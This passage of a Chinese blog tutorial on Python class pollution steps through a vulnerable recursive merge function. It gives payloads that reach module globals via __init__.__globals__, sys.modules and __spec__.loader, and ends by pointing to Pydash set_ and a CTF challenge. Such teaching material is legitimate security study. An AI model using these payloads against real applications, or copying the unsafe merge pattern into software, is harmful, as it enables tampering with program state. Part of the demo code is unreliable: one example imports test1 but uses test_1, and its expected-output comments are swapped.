<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dst = &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x0000022C21DC0970</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;D:\\pythonProject\\pythonProject2\\python原型链污染\\test.py&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;_pydev_stop_at_break&#x27;</span>: &lt;function _pydev_stop_at_break at <span class="number">0x0000022C24A77D30</span>&gt;, <span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;test&#x27;</span>: &lt;function test at <span class="number">0x0000022C24B063A0</span>&gt;,  <span class="string">&#x27;merge&#x27;</span>: &lt;function merge at <span class="number">0x0000022C24B068B0</span>&gt;, <span class="string">&#x27;instance&#x27;</span>: &lt;__main__.b <span class="built_in">object</span> at <span class="number">0x0000022C24B00880</span>&gt;, <span class="string">&#x27;payload&#x27;</span>: &#123;<span class="string">&#x27;__init__&#x27;</span>: &#123;<span class="string">&#x27;__globals__&#x27;</span>: &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">src = &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">k = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">v = &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;</span><br></pre></td></tr></table></div></figure>

<p>此时的判断为<code>True</code>然后进入<code>merge(v, dst.get(k))</code>准备再次递归</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/25.png"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dst = &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x0000022C21DC0970</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;D:\\pythonProject\\pythonProject2\\python原型链污染\\test.py&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;_pydev_stop_at_break&#x27;</span>: &lt;function _pydev_stop_at_break at <span class="number">0x0000022C24A77D30</span>&gt;, <span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;test&#x27;</span>: &lt;function test at <span class="number">0x0000022C24B063A0</span>&gt;,  <span class="string">&#x27;merge&#x27;</span>: &lt;function merge at <span class="number">0x0000022C24B068B0</span>&gt;, <span class="string">&#x27;instance&#x27;</span>: &lt;__main__.b <span class="built_in">object</span> at <span class="number">0x0000022C24B00880</span>&gt;, <span class="string">&#x27;payload&#x27;</span>: &#123;<span class="string">&#x27;__init__&#x27;</span>: &#123;<span class="string">&#x27;__globals__&#x27;</span>: &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">src = &#123;<span class="string">&#x27;secret_var&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">k = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">v = &#123;<span class="string">&#x27;secret_class_var&#x27;</span>: <span class="string">&#x27;Pooooluted ~&#x27;</span>&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="污染-2">
          <a href="#污染-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#污染-2" class="headerlink" title="污染"></a>污染</h4>
      <p>此时对于变量的污染我们可以在第三次递归中看出，此时的第一层判断为<code>True</code>直接进入<code>dst[k] = v</code>进行添加完成第一次的污染</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/23.png"></p>
<p>在函数或类方法中，我们经常会看到<code>__init__</code>初始化方法，但是它作为类的一个内置方法，在没有被重写作为函数的时候，其数据类型会被当做装饰器，而装饰器的特点就是都具有一个全局属性<code>__globals__</code>属性，<code>__globals__</code> 属性是函数对象的一个属性，用于访问该函数所在模块的全局命名空间。具体来说就是，<code>__globals__</code> 属性返回一个字典，里面包含了函数定义时所在模块的全局变量。</p>

        <h2 id="已经加载模块的获取">
          <a href="#已经加载模块的获取" class="heading-link"><i class="fas fa-link"></i></a><a href="#已经加载模块的获取" class="headerlink" title="已经加载模块的获取"></a>已经加载模块的获取</h2>
      <p>局限于当前模块的全局变量获取显然不够，很多情况下需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了</p>

        <h3 id="加载关系简单">
          <a href="#加载关系简单" class="heading-link"><i class="fas fa-link"></i></a><a href="#加载关系简单" class="headerlink" title="加载关系简单"></a>加载关系简单</h3>
      <p>在加载关系简单时，我们可以直接从文件的<code>import</code>语法部分找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>demo：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> test1</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="加载关系复杂">
          <a href="#加载关系复杂" class="heading-link"><i class="fas fa-link"></i></a><a href="#加载关系复杂" class="headerlink" title="加载关系复杂"></a>加载关系复杂</h3>
      <p>如<code>CTF</code>题目等实际环境中往往是多层模块导入，甚至是存在于内置模块或三方模块中导入，这个时候通过直接看代码文件中<code>import</code>语法查找就十分困难，而解决方法则是利用<code>sys</code>模块</p>

        <h4 id="sys模块">
          <a href="#sys模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h4>
      <p><code>sys</code>模块的<code>modules</code>属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>demo：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> test1</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></div></figure>

<p>当然我们去使用的<code>Payload</code>绝大部分情况下是不会这样的，如上的<code>Payload</code>实际上是在已经<code>import sys</code>的情况下使用的，而大部分情况是没有直接导入的，这样问题就从<strong>寻找<code>import</code>特定模块的语句</strong>转换为<strong>寻找<code>import</code>了sys模块的语句</strong>，对问题解决的并不见得有多少优化。</p>

        <h3 id="加载关系复杂的实际利用">
          <a href="#加载关系复杂的实际利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#加载关系复杂的实际利用" class="headerlink" title="加载关系复杂的实际利用"></a>加载关系复杂的实际利用</h3>
      <p>为了进一步优化，这里采用方式是利用<code>Python</code>中加载器<code>loader</code>，在官方文档中给出的定义是：</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/26.png"></p>
<p>简单来说就是为实现模块加载而设计的类，其在<code>importlib</code>这一内置模块中有具体实现。令人庆幸的是<code>importlib</code>模块下所有的<code>py</code>文件中均引入了<code>sys</code>模块</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.__init__&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._bootstrap&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._bootstrap_external&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._common&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.abc&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.machinery&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.metadata&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.resources&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.util&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></div></figure>

<p>所以只要我们能过获取到一个<code>loader</code>便能用如<code>loader.__init__.__globals__[&#39;sys&#39;]</code>的方式拿到<code>sys</code>模块，这样进而获取目标模块。</p>
<p>那<code>loader</code>好获取吗？答案是肯定的。依据官方文档的说明，对于一个模块来说，模块中的一些内置属性会在被加载时自动填充：</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/27.png"></p>
<p><code>__spec__</code>内置属性在<code>Python 3.4</code>版本引入，其包含了关于类加载时的信息，本身是定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，显然因为定义在<code>importlib</code>模块下的<code>py</code>文件，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p>
<p>由于<code>ModuleSpec</code>的属性值设置，相对于上面的获取方式，还有一种相对长的<code>payload</code>的获取方式，主要是利用<code>ModuleSpec</code>中的<code>loader</code>属性。如属性名所示，该属性的值是模块加载时所用的<code>loader</code>，在源码中如下所示：</p>
<p><img src="/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/28.png"></p>
<p>所以有这样的相对长的<code>Payload</code>：<code>&lt;模块名&gt;.__spec__.loader.__init__.__globals__[&#39;sys&#39;]</code></p>

        <h1 id="实际环境下的合并函数">
          <a href="#实际环境下的合并函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际环境下的合并函数" class="headerlink" title="实际环境下的合并函数"></a>实际环境下的合并函数</h1>
      <p>目前发现了<code>Pydash</code>模块中的<code>set_</code>和<code>set_with</code>函数具有如上实例中<code>merge</code>函数类似的类属性赋值逻辑，能够实现污染攻击。<code>idekctf 2022*</code>中的<code>task manager</code>这题就设计使用该函数提供可以污染的环境。</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/01/16/DASCTF0X401/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">DASCTF &amp; 0X401：EzFlask</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2024/01/09/%E6%9F%90%E5%AD%A6%E6%A0%A1%E6%8E%88%E6%9D%83%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0/"><span class="paginator-prev__text">某学校授权渗透测试评估</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Basic%EF%BC%9Adef-merge-src-dic"><span class="toc-number">1.</span> <span class="toc-text">
          Basic：def merge(src,dic)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%87%E5%87%86%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">
          标准代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">
          函数解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hasattr-object-name"><span class="toc-number">1.2.1.</span> <span class="toc-text">
          hasattr(object,name)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getattr-object-name"><span class="toc-number">1.2.2.</span> <span class="toc-text">
          getattr(object,name)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setattr-object-name-value"><span class="toc-number">1.2.3.</span> <span class="toc-text">
          setattr(object,name,value)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.3.</span> <span class="toc-text">
          代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">
          举例分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">
          污染示例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B1%9E%E6%80%A7"><span class="toc-number">2.1.</span> <span class="toc-text">
          污染自定义属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.</span> <span class="toc-text">
          污染过程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B1%82%E9%9D%A2"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">
          代码审计层面</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%80%92%E5%BD%92"><span class="toc-number">2.1.1.1.1.</span> <span class="toc-text">
          第一次递归</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E9%80%92%E5%BD%92"><span class="toc-number">2.1.1.1.2.</span> <span class="toc-text">
          第二次递归</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AC%A1%E9%80%92%E5%BD%92"><span class="toc-number">2.1.1.1.3.</span> <span class="toc-text">
          第三次递归</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93"><span class="toc-number">2.1.1.1.4.</span> <span class="toc-text">
          污染</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E5%B1%82%E9%9D%A2"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">
          断点调试层面</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%80%92%E5%BD%92-1"><span class="toc-number">2.1.1.2.1.</span> <span class="toc-text">
          第一次递归</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E9%80%92%E5%BD%92-1"><span class="toc-number">2.1.1.2.2.</span> <span class="toc-text">
          第二次递归</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AC%A1%E9%80%92%E5%BD%92-1"><span class="toc-number">2.1.1.2.3.</span> <span class="toc-text">
          第三次递归</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93-1"><span class="toc-number">2.1.1.2.4.</span> <span class="toc-text">
          污染</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7"><span class="toc-number">2.2.</span> <span class="toc-text">
          污染内置属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E6%B1%A1%E6%9F%93%E7%9A%84Object"><span class="toc-number">2.3.</span> <span class="toc-text">
          无法污染的Object</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%B4%E5%8A%A0%E5%B9%BF%E6%B3%9B%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">
          更加广泛的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">3.1.</span> <span class="toc-text">
          获取全局变量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E8%BF%87%E7%A8%8B%E4%B9%8B%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95"><span class="toc-number">3.1.1.</span> <span class="toc-text">
          污染过程之断点调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%80%92%E5%BD%92-2"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">
